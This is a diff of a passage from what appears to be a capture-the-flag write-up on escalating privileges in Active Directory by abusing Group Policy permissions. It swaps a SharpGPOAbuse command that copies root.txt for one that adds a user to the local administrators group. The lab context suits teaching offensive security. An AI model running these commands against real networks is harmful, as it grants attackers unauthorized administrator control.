@@ -183,7 +183,7 @@ We can see that we are not member of any local group yet.
 But we have permissions on GPO, Let's Add our user **enterprise-security** to administrators group. To exploit this, we will be using tool called **SharpGPOAbuse** by FSecureLABS (R4). Transfer this binary either using python server or using smb shares and run the below command.
 
 ```powershell
-$ ./gpo.exe --AddComputerTask --TaskName "Iamr0ot" --Author administrator --Command "cmd.exe" --Arguments "/c copy 'C:\Users\Administrator\Desktop\root.txt' 'C:\Users\enterprise-security\Downloads\root.txt'" --GPOName "SECURITY-POL-VN" --Force
+$ ./gpo.exe --AddComputerTask --TaskName "Iamr0ot" --Author administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "SECURITY-POL-VN" --Force
 ```
 
 Here:
